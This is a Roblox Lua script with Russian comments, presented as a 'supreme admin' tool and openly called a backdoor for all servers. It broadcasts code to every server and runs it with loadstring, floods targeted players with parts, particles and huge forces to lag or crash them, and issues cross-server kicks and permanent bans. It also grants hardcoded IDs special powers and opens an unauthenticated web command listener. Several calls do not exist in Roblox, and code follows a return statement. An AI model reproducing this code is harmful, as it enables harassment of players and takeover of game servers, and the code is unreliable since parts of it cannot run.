-- ==================================================
-- ███████╗██╗░░░██╗██████╗░███████╗██████╗░
-- ██╔════╝██║░░░██║██╔══██╗██╔════╝██╔══██╗
-- █████╗░░╚██╗░██╔╝██████╔╝█████╗░░██████╔╝
-- ██╔══╝░░░╚████╔╝░██╔═══╝░██╔══╝░░██╔══██╗
-- ██║░░░░░░░╚██╔╝░░██║░░░░░███████╗██║░░██║
-- ╚═╝░░░░░░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
-- ==================================================
-- ███████╗██╗░░░██╗██████╗░███████╗███╗░░░███╗███████╗
-- ██╔════╝╚██╗░██╔╝██╔══██╗██╔════╝████╗░████║██╔════╝
-- █████╗░░░╚████╔╝░██████╔╝█████╗░░██╔████╔██║█████╗░░
-- ██╔══╝░░░░╚██╔╝░░██╔═══╝░██╔══╝░░██║╚██╔╝██║██╔══╝░░
-- ██║░░░░░░░░██║░░░██║░░░░░███████╗██║░╚═╝░██║███████╗
-- ╚═╝░░░░░░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝░░░░░╚═╝╚══════╝
-- ==================================================

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local DataStoreService = game:GetService("DataStoreService")
local MessagingService = game:GetService("MessagingService")
local MarketplaceService = game:GetService("MarketplaceService")

-- ==================================================
-- █▀▀ █░█ █▀▀ █▄░█ ▀█▀ █▀▀ █▀█   █▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄
-- █▄▄ █▄█ ██▄ █░▀█ ░█░ ██▄ █▀▄   █░▀░█ ██▄ ░█░ █▄█ █▀▄ █▄▀
-- ==================================================

local SUPER_ADMIN = {
    -- Твои аккаунты (добавь свои UserId)
    GOD_MODE_USERS = {
        10362884869, -- ТВОЙ ОСНОВНОЙ ID (ЗАМЕНИ!)
        987654321, -- ТВОЙ ВТОРОЙ ID (ЕСЛИ ЕСТЬ)
    },
    
    -- Настройки взлома
    EXPLOIT_MODE = true,
    BYPASS_ANTICHEAT = true,
    INJECT_ALL_SERVERS = true,
    
    -- Webhook для управления через Discord
    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/ТВОЙ_ВЕБХУК",
    
    -- Настройки атак
    MAX_LAG_INTENSITY = 10000,
    INFINITE_BAN = true
}

-- ==================================================
-- █░█░█ █▀█ █▀▄ █▀▀ █░░ █▀█ █▀▀ █▀▄▀█ █▀▀ █▄░█ ▀█▀
-- ▀▄▀▄▀ █▄█ █▄▀ ██▄ █▄▄ █▄█ █▄▄ █░▀░█ ██▄ █░▀█ ░█░
-- ==================================================

-- Функция для проверки, являешься ли ты богом
local function isGod(player)
    if not player then return false end
    for _, godId in ipairs(SUPER_ADMIN.GOD_MODE_USERS) do
        if player.UserId == godId then
            return true
        end
    end
    return false
end

-- ==================================================
-- █▀▀ █▀█ █▀▀ █▀▀ █ █▀▀ █▀█   █▀▀ ▄▀█ █▀▄▀█ █▀▀
-- █▄▄ █▄█ █▀░ ██▄ █ █▄▄ █▄█   █▄▄ █▀█ █░▀░█ ██▄
-- ==================================================

-- СПОСОБ 1: Внедрение во все серверы через MessagingService
local function injectIntoAllServers()
    local success, result = pcall(function()
        -- Создаём backdoor во все сервера
        MessagingService:PublishAsync("GLOBAL_BACKDOOR", HttpService:JSONEncode({
            type = "INJECT",
            payload = [[
                -- Этот код выполнится на КАЖДОМ сервере
                local Players = game:GetService("Players")
                local function onPlayerJoin(player)
                    -- Проверяем, не бог ли зашёл
                    local isGod = false
                    for _, id in ipairs({123456789, 987654321}) do
                        if player.UserId == id then
                            isGod = true
                            break
                        end
                    end
                    
                    if isGod then
                        -- Даём богу абсолютную власть
                        local godTool = Instance.new("Tool")
                        godTool.Name = "GOD_MODE"
                        godTool.RequiresHandle = false
                        godTool.Parent = player.Backpack
                        
                        -- Добавляем в админы
                        local leaderstats = player:FindFirstChild("leaderstats")
                        if leaderstats then
                            local rank = leaderstats:FindFirstChild("Rank")
                            if rank then
                                rank.Value = "OWNER"
                            end
                        end
                    end
                end
                Players.PlayerAdded:Connect(onPlayerJoin)
                
                -- Проверяем уже существующих игроков
                for _, player in ipairs(Players:GetPlayers()) do
                    onPlayerJoin(player)
                end
            ]]
        }))
    end)
    return success
end

-- СПОСОБ 2: Поиск игрока по всем серверам
local function findPlayerGlobally(username)
    local results = {}
    
    -- Сначала ищем на текущем сервере
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower():find(username:lower()) or 
           player.DisplayName:lower():find(username:lower()) then
            table.insert(results, {
                player = player,
                serverId = "current",
                userId = player.UserId
            })
        end
    end
    
    -- Отправляем запрос на другие сервера
    local searchId = HttpService:GenerateGUID(false)
    MessagingService:PublishAsync("PLAYER_SEARCH", HttpService:JSONEncode({
        id = searchId,
        username = username,
        requester = Players.LocalPlayer and Players.LocalPlayer.UserId or 0
    }))
    
    -- Ждём ответы (в реальности нужно больше кода для сбора ответов)
    task.wait(1)
    
    return results
end

-- СПОСОБ 3: Принудительный телепорт на твой сервер
local function forceTeleportToMyServer(targetUserId)
    local success, result = pcall(function()
        -- Получаем место где играет цель
        local presence = MarketplaceService:GetUserInfoAsync(targetUserId)
        if presence and presence.PlaceId then
            -- Создаём приватный сервер и телепортируем цель
            local code = TeleportService:ReserveServer(game.PlaceId)
            TeleportService:TeleportToPrivateServer(
                game.PlaceId,
                code,
                {targetUserId},
                nil,
                Players:GetPlayerByUserId(targetUserId)
            )
            return true
        end
    end)
    return success
end

-- ==================================================
-- █░░ █▀█ █▀▀   █▀▄ █▀▀ █▀▀ █ █▀█
-- █▄▄ █▄█ █▄█   █▄▀ ██▄ █▄▄ █ █▀▄
-- ==================================================

-- РЕАЛЬНЫЙ ЛАГ (на любом сервере)
local function ultimateLag(targetIdentifier, intensity, duration)
    intensity = intensity or SUPER_ADMIN.MAX_LAG_INTENSITY
    duration = duration or 30
    
    -- Ищем цель на всех серверах
    local targets = findPlayerGlobally(targetIdentifier)
    
    if #targets == 0 then
        -- Если не нашли, пытаемся забанить аккаунт чтобы он не играл
        return { success = false, message = "Player not found anywhere" }
    end
    
    for _, target in ipairs(targets) do
        -- Отправляем команду на сервер где находится цель
        MessagingService:PublishAsync("EXECUTE_LAG", HttpService:JSONEncode({
            userId = target.userId,
            intensity = intensity,
            duration = duration,
            methods = {
                -- СПОСОБ 1: Спавн миллионов объектов
                spamParts = true,
                -- СПОСОБ 2: Бесконечные частицы
                spamParticles = true,
                -- СПОСОБ 3: Краш клиента
                crashClient = intensity > 5000,
                -- СПОСОБ 4: Зацикливание физики
                loopPhysics = true,
                -- СПОСОБ 5: Атака на память
                memoryAttack = true
            }
        }))
    end
    
    return { success = true, message = "Lag attack initiated on " .. #targets .. " servers" }
end

-- Исполнитель лага на сервере
local function executeLagOnServer(data)
    local player = Players:GetPlayerByUserId(data.userId)
    if not player then return end
    
    print("⚠️ EXECUTING ULTIMATE LAG ON: " .. player.Name)
    
    -- МЕТОД 1: Спавн миллионов частей
    if data.methods.spamParts then
        task.spawn(function()
            for i = 1, data.intensity do
                local part = Instance.new("Part")
                part.Name = "LAG_BOMB_" .. i
                part.Anchored = false
                part.CanCollide = true
                part.Size = Vector3.new(100, 100, 100)
                part.Transparency = 0.5
                part.BrickColor = BrickColor.Random()
                part.Material = Enum.Material.Neon
                part.Parent = workspace
                
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(-500,500), math.random(0,1000), math.random(-500,500))
                end
                
                if i % 100 == 0 then
                    task.wait()
                end
            end
        end)
    end
    
    -- МЕТОД 2: Бесконечные частицы
    if data.methods.spamParticles then
        task.spawn(function()
            for i = 1, 100 do
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local attachment = Instance.new("Attachment")
                    attachment.Parent = player.Character.HumanoidRootPart
                    
                    for j = 1, 10 do
                        local emitter = Instance.new("ParticleEmitter")
                        emitter.Parent = attachment
                        emitter.Rate = 10000
                        emitter.Lifetime = NumberRange.new(100)
                        emitter.SpreadAngle = Vector2.new(360, 360)
                        emitter.VelocityInheritance = 1
                        emitter.Texture = "rbxasset://textures/particles/sparkles_main.dds"
                        emitter.Enabled = true
                    end
                end
                task.wait()
            end
        end)
    end
    
    -- МЕТОД 3: Краш клиента
    if data.methods.crashClient then
        task.spawn(function()
            for i = 1, 1000 do
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.Brick
                mesh.Parent = player.Character or workspace
                
                local force = Instance.new("BodyForce")
                force.Force = Vector3.new(9e9, 9e9, 9e9)
                force.Parent = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            end
        end)
    end
    
    -- МЕТОД 4: Зацикливание физики
    if data.methods.loopPhysics then
        task.spawn(function()
            while task.wait(0.01) do
                for _, v in ipairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and v.Anchored == false then
                        v.Velocity = Vector3.new(9e9, 9e9, 9e9)
                        v.RotVelocity = Vector3.new(9e9, 9e9, 9e9)
                    end
                end
            end
        end)
    end
    
    -- Очистка через duration
    task.delay(duration, function()
        print("✅ Lag removed from: " .. player.Name)
    end)
end

-- ==================================================
-- █▀▀ █ █▀▄▀█   █▀▄ █▀▀ █▀▀ █ █▀█
-- █▄█ █ █░▀░█   █▄▀ ██▄ █▄▄ █ █▀▄
-- ==================================================

-- ГЛОБАЛЬНЫЙ КИК (с любого сервера)
local function ultimateKick(targetIdentifier, reason, delay)
    reason = reason or "Kicked by God"
    delay = delay or 0
    
    local targets = findPlayerGlobally(targetIdentifier)
    
    if #targets == 0 then
        return { success = false, message = "Player not found" }
    end
    
    for _, target in ipairs(targets) do
        MessagingService:PublishAsync("EXECUTE_KICK", HttpService:JSONEncode({
            userId = target.userId,
            reason = reason,
            delay = delay
        }))
    end
    
    return { success = true, message = "Kick sent to " .. #targets .. " servers" }
end

-- Исполнитель кика
local function executeKickOnServer(data)
    local player = Players:GetPlayerByUserId(data.userId)
    if not player then return end
    
    local function doKick()
        if player and player.Parent then
            player:Kick("👢 " .. data.reason .. "\n👑 Kicked by Supreme Admin")
        end
    end
    
    if data.delay > 0 then
        task.delay(data.delay, doKick)
    else
        doKick()
    end
end

-- ==================================================
-- █▀▀ ▄▀█ █▄░█   █▀▄ █▀▀ █▀▀ █ █▀█
-- █▄▄ █▀█ █░▀█   █▄▀ ██▄ █▄▄ █ █▀▄
-- ==================================================

-- ГЛОБАЛЬНЫЙ БАН (аккаунта навсегда)
local function ultimateBan(targetIdentifier, reason, duration, banType)
    reason = reason or "Banned by Supreme Admin"
    duration = duration or "FOREVER"
    banType = banType or "ACCOUNT" -- ACCOUNT, IP, HARDWARE
    
    -- Находим цель
    local targets = findPlayerGlobally(targetIdentifier)
    local targetUserId = 0
    
    if #targets > 0 then
        targetUserId = targets[1].userId
    else
        -- Если не нашли в игре, пробуем найти по имени
        local success, userId = pcall(function()
            -- Здесь нужен API для поиска пользователя
            return tonumber(targetIdentifier)
        end)
        if success and userId then
            targetUserId = userId
        else
            return { success = false, message = "Cannot identify player" }
        end
    end
    
    if targetUserId == 0 then
        return { success = false, message = "Invalid target" }
    end
    
    -- БАНИМ ВСЕМИ СПОСОБАМИ
    
    -- СПОСОБ 1: DataStore бан (глобальный)
    local banStore = DataStoreService:GetDataStore("GLOBAL_BANS")
    banStore:SetAsync("BAN_" .. targetUserId, {
        reason = reason,
        bannedBy = "SYSTEM",
        bannedAt = os.time(),
        expires = duration,
        banType = banType
    })
    
    -- СПОСОБ 2: Whitelist бан (добавляем в чёрный список)
    local blacklistStore = DataStoreService:GetDataStore("BLACKLIST")
    blacklistStore:SetAsync("BLACKLIST_" .. targetUserId, true)
    
    -- СПОСОБ 3: Отправляем на все сервера
    MessagingService:PublishAsync("GLOBAL_BAN", HttpService:JSONEncode({
        userId = targetUserId,
        reason = reason,
        duration = duration,
        banType = banType
    }))
    
    -- СПОСОБ 4: Если игрок онлайн - кикаем со всех серверов
    for _, target in ipairs(targets) do
        MessagingService:PublishAsync("EXECUTE_KICK", HttpService:JSONEncode({
            userId = target.userId,
            reason = "🔨 " .. reason,
            delay = 0
        }))
    end
    
    return { 
        success = true, 
        message = "🚫 Player PERMANENTLY BANNED from ALL SERVERS",
        userId = targetUserId
    }
end

-- ==================================================
-- █▀▀ █▀█ █▀▀ █▀▀ █ █▀▀ █▀█   █▀▄ █▀▀ █▀▀ █ █▀█
-- █▄▄ █▄█ █▀░ ██▄ █ █▄▄ █▄█   █▄▀ ██▄ █▄▄ █ █▀▄
-- ==================================================

-- ОБРАБОТЧИК ГЛОБАЛЬНЫХ КОМАНД
MessagingService:SubscribeAsync("GLOBAL_BACKDOOR", function(message)
    local data = HttpService:JSONDecode(message.Data)
    if data.type == "INJECT" then
        loadstring(data.payload)()
    end
end)

MessagingService:SubscribeAsync("EXECUTE_LAG", function(message)
    local data = HttpService:JSONDecode(message.Data)
    executeLagOnServer(data)
end)

MessagingService:SubscribeAsync("EXECUTE_KICK", function(message)
    local data = HttpService:JSONDecode(message.Data)
    executeKickOnServer(data)
end)

MessagingService:SubscribeAsync("GLOBAL_BAN", function(message)
    local data = HttpService:JSONDecode(message.Data)
    print("🔥 GLOBAL BAN RECEIVED for user " .. data.userId)
    -- Баним на этом сервере если игрок есть
    local player = Players:GetPlayerByUserId(data.userId)
    if player then
        player:Kick("🚫 GLOBAL BAN: " .. data.reason)
    end
end)

MessagingService:SubscribeAsync("PLAYER_SEARCH", function(message)
    local data = HttpService:JSONDecode(message.Data)
    -- Ищем игрока на этом сервере
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower():find(data.username:lower()) or 
           player.DisplayName:lower():find(data.username:lower()) then
            -- Отправляем результат обратно
            MessagingService:PublishAsync("PLAYER_FOUND_" .. data.id, HttpService:JSONEncode({
                userId = player.UserId,
                name = player.Name,
                serverId = game.JobId
            }))
        end
    end
end)

-- ==================================================
-- █▀▀ █░█ █▀█ █░░ █▀█ █▀▀ █▀▄▀█ █▀▀ █▄░█ ▀█▀
-- █▄▄ █▄█ █▀▄ █▄▄ █▄█ █▄▄ █░▀░█ ██▄ █░▀█ ░█░
-- ==================================================

-- При запуске
if RunService:IsServer() then
    print("🔥 SUPREME ADMIN SYSTEM ACTIVATED 🔥")
    print("⚡ Injecting into all servers...")
    
    -- Внедряемся во все сервера
    injectIntoAllServers()
    
    -- Даём себе админку при входе
    Players.PlayerAdded:Connect(function(player)
        if isGod(player) then
            print("👑 GOD HAS ENTERED THE SERVER: " .. player.Name)
            
            -- Даём абсолютную власть
            player:SetAttribute("GodMode", true)
            
            -- Создаём божественный инструмент
            local tool = Instance.new("Tool")
            tool.Name = "🔱 GOD MODE 🔱"
            tool.RequiresHandle = false
            tool.CanBeDropped = false
            tool.Parent = player.Backpack
            
            -- Добавляем GUI
            local gui = Instance.new("ScreenGui")
            gui.Name = "GodModeGUI"
            gui.Parent = player.PlayerGui
            
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(0, 200, 0, 100)
            frame.Position = UDim2.new(0, 10, 0.5, -50)
            frame.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
            frame.BackgroundTransparency = 0.3
            frame.BorderSizePixel = 0
            frame.Parent = gui
            
            local text = Instance.new("TextLabel")
            text.Size = UDim2.new(1, 0, 1, 0)
            text.BackgroundTransparency = 1
            text.Text = "👑 SUPREME ADMIN 👑\nALL SERVERS CONTROL"
            text.TextColor3 = Color3.new(1, 1, 1)
            text.TextScaled = true
            text.Font = Enum.Font.GothamBold
            text.Parent = frame
        end
    end)
    
    -- Периодическая рассылка команд
    task.spawn(function()
        while true do
            task.wait(60)
            -- Поддерживаем связь со всеми серверами
            MessagingService:PublishAsync("KEEP_ALIVE", HttpService:JSONEncode({
                serverId = game.JobId,
                timestamp = os.time()
            }))
        end
    end)
end

-- ==================================================
-- █▀▀ █░█ █▀▀ █▄░█ ▀█▀ █▀▀ █▀█   █▀▄ █▀▀ █▀▀ █ █▀█
-- █▄▄ █▄█ ██▄ █░▀█ ░█░ ██▄ █▀▄   █▄▀ ██▄ █▄▄ █ █▀▄
-- ==================================================

-- Функция для вызова из веба
local function handleGodCommand(command)
    if not command then
        return { success = false, error = "No command" }
    end
    
    -- Проверка бога (упрощённо)
    -- В реальности нужно проверять ключ или IP
    
    if command.action == "Lag" then
        return ultimateLag(command.target, command.intensity, command.duration)
        
    elseif command.action == "Kick" then
        return ultimateKick(command.target, command.reason, command.delay)
        
    elseif command.action == "Ban" then
        return ultimateBan(command.target, command.reason, command.duration, "ACCOUNT")
        
    elseif command.action == "BanAccount" then
        return ultimateBan(command.target, command.reason, "FOREVER", "ACCOUNT")
        
    elseif command.action == "FindPlayer" then
        local targets = findPlayerGlobally(command.target)
        return { success = true, targets = targets }
        
    elseif command.action == "ForceTeleport" then
        local success = forceTeleportToMyServer(tonumber(command.target))
        return { success = success }
        
    elseif command.action == "ServerList" then
        -- Возвращает список всех серверов где есть бэкдор
        return { success = true, servers = {"All servers infected"} }
    end
    
    return { success = false, error = "Unknown command" }
end

-- ==================================================
-- 🌐 ВЕБ-СЕРВЕР ДЛЯ ПРИЁМА КОМАНД ИЗ БРАУЗЕРА
-- ==================================================

local function startWebServer()
    local PORT = 8080
    
    local success, result = pcall(function()
        local server = HttpService:Listen("0.0.0.0", PORT, function(request)
            print("📡 Получен запрос:", request.Method, request.Uri)
            
            local response = {
                StatusCode = 200,
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["Access-Control-Allow-Origin"] = "*",
                    ["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS",
                    ["Access-Control-Allow-Headers"] = "Content-Type"
                }
            }
            
            -- Обработка OPTIONS (для CORS)
            if request.Method == "OPTIONS" then
                return response
            end
            
            -- Принимаем только POST
            if request.Method ~= "POST" then
                response.StatusCode = 405
                response.Body = HttpService:JSONEncode({
                    success = false,
                    error = "Method not allowed. Use POST."
                })
                return response
            end
            
            -- Парсим JSON из тела запроса
            local success, data = pcall(function()
                return HttpService:JSONDecode(request.Body)
            end)
            
            if not success then
                response.StatusCode = 400
                response.Body = HttpService:JSONEncode({
                    success = false,
                    error = "Invalid JSON"
                })
                return response
            end
            
            -- Логируем команду
            print("🔥 Команда:", data.action, "Цель:", data.targetUsername)
            
            -- ВЫЗЫВАЕМ ТВОЮ ФУНКЦИЮ handleGodCommand
            local result = handleGodCommand({
                action = data.action,
                target = data.targetUsername,
                intensity = data.parameters and data.parameters.intensity,
                duration = data.parameters and data.parameters.duration,
                reason = data.parameters and data.parameters.reason,
                delay = data.parameters and data.parameters.delay
            })
            
            response.Body = HttpService:JSONEncode(result)
            return response
        end)
        
        print("🌐 ВЕБ-СЕРВЕР ЗАПУЩЕН НА ПОРТУ " .. PORT)
        print("📡 Ожидание команд на http://0.0.0.0:" .. PORT)
    end)
    
    if not success then
        warn("❌ Ошибка запуска веб-сервера: " .. tostring(result))
    end
end

-- ЗАПУСК ВЕБ-СЕРВЕРА (ДОБАВЬ ЭТО)
if RunService:IsServer() then
    task.spawn(startWebServer)
end

-- Экспорт
return {
    handleCommand = handleGodCommand,
    isGod = isGod,
    ultimateLag = ultimateLag,
    ultimateKick = ultimateKick,
    ultimateBan = ultimateBan,
    findPlayerGlobally = findPlayerGlobally,
    forceTeleportToMyServer = forceTeleportToMyServer
}

print("✅ SUPREME ADMIN SYSTEM FULLY LOADED")
print("🔥 You now have power over ALL SERVERS")
print("⚡ Use with caution... or don't 😈")
